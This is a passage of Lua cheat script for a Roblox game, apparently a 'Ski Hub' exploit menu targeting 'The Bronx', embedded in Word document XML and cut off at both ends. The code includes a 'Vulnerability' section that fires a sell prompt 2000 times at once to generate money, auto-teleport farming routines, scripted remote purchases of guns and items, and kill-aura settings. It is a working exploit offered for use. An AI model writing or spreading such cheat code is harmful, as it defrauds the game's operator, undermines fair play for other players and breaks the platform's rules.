        <w:t xml:space="preserve">        Teleport(Cleaner.WorldPivot)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        task.wait(0.4)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        fireproximityprompt(Cleaner:FindFirstChild("CashPrompt", true))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        repeat task.wait() until Cleaner:FindFirstChild("On", true).Color == Color3.fromRGB(74,156,69)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        task.wait(0.5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        fireproximityprompt(Cleaner:FindFirstChild("CashPrompt", true))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        task.wait(0.25)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Teleport(Cleaner.WorldPivot)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        task.wait(0.4)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        repeat task.wait() until LocalPlayer.Backpack:FindFirstChild("MoneyReady")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        humanoid:EquipTool(LocalPlayer.Backpack["MoneyReady"])</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        repeat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            fireproximityprompt(Cleaner:FindFirstChild("GrabPrompt", true))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.wait(3)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        until not character:FindFirstChild("MoneyReady")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        repeat task.wait(1) until LocalPlayer.Backpack:FindFirstChild("BagOfMoney")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Teleport(CFrame.new(-222.29, 283.81, -1200.90))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        humanoid:EquipTool(LocalPlayer.Backpack["BagOfMoney"])</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        task.wait(2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        fireproximityprompt(Workspace.ATMMoney.Prompt)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Teleport(OldCF)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>VulnerabilitySection:button({name = "Manual Generate Max Money", callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local char = LocalPlayer.Character</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if not char then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local hrp = char:FindFirstChild("HumanoidRootPart")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if not hrp then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local Cup = nil</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        for _, v in ipairs(char:GetChildren()) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if v:IsA("Tool") and v.Name == "Ice-Fruit Cupz" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Cup = v</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                break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if not Cup then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for _, v in ipairs(LocalPlayer.Backpack:GetChildren()) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if v:IsA("Tool") and v.Name == "Ice-Fruit Cupz" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Cup = v</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    break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if not Cup then</w:t>
      </w:r>
    </w:p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"U Dont Have Cup!",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    return</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if Cup.Parent == LocalPlayer.Backpack then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            char.Humanoid:EquipTool(Cup)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.wait(0.5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local OldCFrame = hrp.CFrame</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Teleport(Workspace["IceFruit Sell"].CFrame, true)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        task.wait(0.5)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Workspace["IceFruit Sell"].ProximityPrompt.HoldDuration = 0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        for i = 1, 2000 do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                _fireproximityprompt(Workspace["IceFruit Sell"].ProximityPrompt)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        task.wait(0.5)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Teleport(OldCFrame, true)</w:t>
      </w:r>
    </w:p>
    <w:p/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"Manual Money Done",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            lifetime = 5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>VulnerabilitySection:button({name = "Buy Items For Manual And Tp Stove", callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local Items = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "FijiWater",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "FreshWater",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "Ice-Fruit Bag",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "Ice-Fruit Cupz"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        for _, item in ipairs(Items) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if not LocalPlayer.Backpack:FindFirstChild(item) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ReplicatedStorage:WaitForChild("ExoticShopRemote"):InvokeServer(item)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.wait(0.07)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"Bought Items!",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            lifetime = 5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        })</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local Stove = nil</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        for _, v in Workspace.CookingPots:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if v:IsA("Model") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local prompt = v:FindFirstChildWhichIsA("ProximityPrompt", true)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if prompt and prompt.ActionText == "Turn On" and prompt.Enabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Stove = v</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    break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if Stove and Stove:FindFirstChild("CookPart") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Teleport(Stove.CookPart.CFrame, true)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local KillAuraSection = Column:section({name = "Kill Aura Section", size = 0.275, default = false, side = 'right', icon = GetImage("Bullet.png")}) </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                KillAuraSection:toggle({name = "Enabled - Hold Gun", flag = "KillAura_Enabled_TB3", type = "toggle", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.KillAura = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                KillAuraSection:slider({name = "Kill Aura Range", flag = "KillAuraRange_TB3", min = 0, max = 1000, default = 300, suffix = "st", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.KillAuraRange = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            do -- \\ Purchase Guns</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local PurchaseGunColumn = PurchaseGunTab:column({})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local WeaponListSection = PurchaseGunColumn:section({name = "Purchase Selected Item", side = "left", size = 0.550, icon = GetImage("Cash.png")})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                --[[WeaponListSection:list({flag = "PurchaseSelectedItem_TheBronx", options = Config.Guns, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.spawn(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not state then</w:t>
      </w:r>
    </w:p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Config.TheBronx.Selected_Item = state</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local self = string.match(Config.TheBronx.Selected_Item, "^(.*) %-");</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        self = self:match("^%s*(.-)%s*$");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local OldCFrame = LocalPlayer.Character.HumanoidRootPart.CFrame;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Prompt = Workspace:FindFirstChild("GUNS")[self]:FindFirstChildWhichIsA("ProximityPrompt",true);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if (Workspace:FindFirstChild("GUNS")[self]:FindFirstChild("GamepassID", true) and not MarketplaceService:UserOwnsGamePassAsync(LocalPlayer.UserId, Workspace:FindFirstChild("GUNS")[self]:FindFirstChild("GamepassID",true).Value)) then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            return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`You do not own this gamepass!`,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>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        --if Solara then Prompt.HoldDuration = 0; end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Part = Prompt.Parent:IsA("Part") and Prompt.Parent.CFrame or Prompt.Parent:IsA("MeshPart") and Prompt.Parent.CFrame or Prompt.Parent:IsA("UnionOperation") and Prompt.Parent.CFrame;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if LocalPlayer.stored.Money.Value &lt; Workspace:FindFirstChild("GUNS")[self]:FindFirstChild("Price",true).Value then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            return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`You are ${Workspace:FindFirstChild("GUNS")[self]:FindFirstChild("Price",true).Value - LocalPlayer.stored.Money.Value} short.`,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>
      <w:r>
        <w:t xml:space="preserve">                        end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.spawn(Teleport, Part)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(0.3)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local ItemReceieved = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local Check = LocalPlayer.Backpack.ChildAdded:Connect(function(Child)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                if tostring(Child) == tostring(self) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    ItemReceieved = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                task.wait(1.5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                ItemReceieved = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            repeat task.wait() until ItemReceieved == true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Check:Disconnect()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        repeat task.wait(); fireproximityprompt(Prompt); until ItemReceieved == true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                       task.wait(0.3)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.spawn(Teleport, OldCFrame)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        library.notifications:create_notification({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            name = "Ski Hub",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            info = `Successfully purchased {self}!`,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            lifetime = 5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})]]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                --new item buy</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>WeaponListSection:list({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    flag = "PurchaseSelectedItem_TheBronx",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    options = Config.Guns,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        task.spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if not state then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local item = string.match(state, "^(.*) %-")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if not item then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            item = item:match("^%s*(.-)%s*$")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local gunFolder = Workspace:FindFirstChild("GUNS")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if not gunFolder then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local gun = gunFolder:FindFirstChild(item)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if not gun then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local prompt = gun:FindFirstChildWhichIsA("ProximityPrompt", true)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local price = gun:FindFirstChild("Price", true)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local gamepass = gun:FindFirstChild("GamepassID", true)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if not prompt or not price then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local HRP = LocalPlayer.Character.HumanoidRootPart</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local oldCF = HRP.CFrame</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if gamepass then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local id = gamepass.Value</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not MarketplaceService:UserOwnsGamePassAsync(LocalPlayer.UserId, id) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    return library.notifications:create_notification({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        name = "Ski Hub",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        info = "You do not own the gamepass!",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        lifetime = 4</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    })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if LocalPlayer.stored.Money.Value &lt; price.Value then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return library.notifications:create_notification({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    name = "Ski Hub",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    info = `You are {price.Value - LocalPlayer.stored.Money.Value} short.`,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    lifetime = 4</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local part = prompt.Parent.CFrame or gun.PrimaryPart.CFrame</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            HRP.CFrame = part</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.wait(0.05)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                prompt.MaxActivationDistance = 25</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                prompt.Parent.CFrame = HRP.CFrame</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.wait(0.05)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for i = 1, 3 do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    fireproximityprompt(prompt, 1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.wait(0.1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.wait(0.5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            HRP.CFrame = oldCF</w:t>
      </w:r>
    </w:p>
    <w:p/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`Purchased {item}!`,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                lifetime = 4</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            })</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local quickbuysec = PurchaseGunColumn:section({name = "Quick Buy", side = "left", size = 0.450, icon = GetImage("Cash.png")})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local ReplicatedStorage = game:GetService("ReplicatedStorage")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local Workspace = game:GetService("Workspace")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local LocalPlayer = game:GetService("Players").LocalPlayer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local MarketplaceService = game:GetService("MarketplaceService")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local GunsFolder = Workspace:WaitForChild("GUNS")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local ShopRemote2 = ReplicatedStorage:WaitForChild("ShopRemote2")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local ExoticShopRemote = ReplicatedStorage:WaitForChild("ExoticShopRemote")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local GunsToBuy = {"Draco", "BagElite"}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local function SmartTP(cf)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local HRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if HRP then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        HRP.CFrame = cf</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>for _, gunName in ipairs(GunsToBuy) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    quickbuysec:button({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        name = gunName,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local gun = GunsFolder:FindFirstChild(gunName)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if not gun then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return library.notifications:create_notification({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    name = "Ski Hub",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    info = gunName .. " not found!",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    lifetime = 5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
